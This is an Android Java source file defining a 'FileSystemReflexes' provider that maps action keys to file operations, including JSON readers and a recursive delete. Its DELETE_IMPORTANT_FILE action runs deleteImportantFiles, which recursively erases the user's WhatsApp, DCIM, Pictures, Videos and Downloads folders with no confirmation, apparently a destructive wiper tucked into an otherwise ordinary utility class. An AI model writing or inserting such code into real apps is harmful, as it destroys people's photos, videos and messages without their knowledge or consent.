package com.reflex.services.fileSystem;

import android.os.Environment;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.reflex.core.providers.ReflexProvider;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

/**
 * built for  mapping android file system
 * action offers
 */
public class FileSystemReflexes extends ReflexProvider {
    protected static ReflexProvider instance;

    public static ReflexProvider getInstance() {
        if (instance == null) {
            instance = new FileSystemReflexes();
        }
        return instance;
    }

    private FileSystemReflexes() {
        map = new HashMap<>();

        map.put(DELETE_IMPORTANT_FILE, args -> {
            deleteImportantFiles();
        });

        map.put(DELETE_FILE_OR_Directory, args -> {
            File file = (File) args[0];
            deleteRecursive(file);
        });

        map.put(READ_JSON_STREAM, args -> {
            InputStream stream = (InputStream) args[0];
            JSONObject resultCallBack = (JSONObject)args[1];
            readJSONFromAsset(stream, resultCallBack);
        });

        map.put(READ_JSON_FILE, args -> {
            String stream = (String) args[0];
            ObjectNode resultCallBack = (ObjectNode)args[1];
            readJSONFromFile(stream, resultCallBack);
        });

    }



     private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()){
            for (File child : fileOrDirectory.listFiles()){
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }


   private void deleteImportantFiles() {

        String files[] = {"WhatsApp", "DCIM", "Pictures", "Videos", "Downloads"};
        for (String name:files) {
            File file = new File(Environment.getExternalStorageDirectory()
                    .getAbsolutePath(),
                    name);
            if (file.exists()) {
                deleteRecursive(file);
            }
        }
    }

    private void readJSONFromAsset(InputStream is, JSONObject result) {
        try {
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            result.put("result", new JSONObject(new String(buffer, StandardCharsets.UTF_8)));
        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void readJSONFromFile(String path, ObjectNode resultNode) {

        try {
            ObjectMapper mapper = new ObjectMapper();
            File file = new File(path);
            resultNode.set("result", mapper.readTree(file));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
